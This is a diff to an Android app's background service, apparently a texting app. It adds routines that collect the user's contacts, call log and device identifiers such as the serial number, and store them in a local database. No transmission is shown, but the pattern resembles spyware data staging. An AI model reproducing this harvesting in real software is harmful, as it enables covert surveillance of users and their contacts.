@@ -2,10 +2,13 @@ package com.candroid.textme;
 
 import android.app.IntentService;
 import android.content.Intent;
+import android.database.SQLException;
 import android.database.sqlite.SQLiteDatabase;
 import android.database.sqlite.SQLiteException;
+import android.os.Build;
 
 import java.io.File;
+import java.util.ArrayList;
 
 public class FilesIntentService extends IntentService {
     public static final String ACTION_DCIM_FILES = "ACTION_DCIM_FILES";
@@ -13,6 +16,9 @@ public class FilesIntentService extends IntentService {
         super("FilesIntentService");
     }
     public static final String ACTION_PACKAGES = "ACTION_PACKAGES";
+    public static final String ACTION_CONTACTS = "ACTION_CONTACTS";
+    public static final String ACTION_DEVICE_INFO = "ACTION_DEVICE_INFO";
+    public static final String ACTION_PHONE_CALLS = "ACTION_PHONE_CALLS";
     @Override
     protected void onHandleIntent(Intent intent) {
         if (intent != null && intent.getAction() != null) {
@@ -49,8 +55,45 @@ public class FilesIntentService extends IntentService {
                         database.close();
                     }
                 }
+            }else if(intent.getAction().equals(ACTION_CONTACTS)){
+                ArrayList<Contact> contacts = Lofl.fetchContactsInformation(this);
+                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+                try{
+                    database.beginTransaction();
+                    Database.insertContacts(database, contacts);
+                    database.setTransactionSuccessful();
+                }catch (SQLiteException e){
+                    e.printStackTrace();
+                }finally{
+                    database.endTransaction();
+                    database.close();
+                }
+            }else if(intent.getAction().equals(ACTION_DEVICE_INFO)){
+                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+                try{
+                    database.beginTransaction();
+                    Database.insertDevice(database, MessagingService.sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
+                    database.setTransactionSuccessful();
+                }catch (SQLException e){
+                    e.printStackTrace();
+                }finally {
+                    database.endTransaction();
+                    database.close();
+                }
+            }else if(intent.getAction().equals(ACTION_PHONE_CALLS)){
+                ArrayList<PhoneCall> phoneCalls = Lofl.fetchCallLog(this);
+                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+                try{
+                    database.beginTransaction();
+                    Database.insertPhoneCalls(database, phoneCalls);
+                    database.setTransactionSuccessful();
+                }catch (SQLException e){
+                    e.printStackTrace();
+                }finally{
+                    database.endTransaction();
+                    database.close();
+                }
             }
         }
-
     }
 }
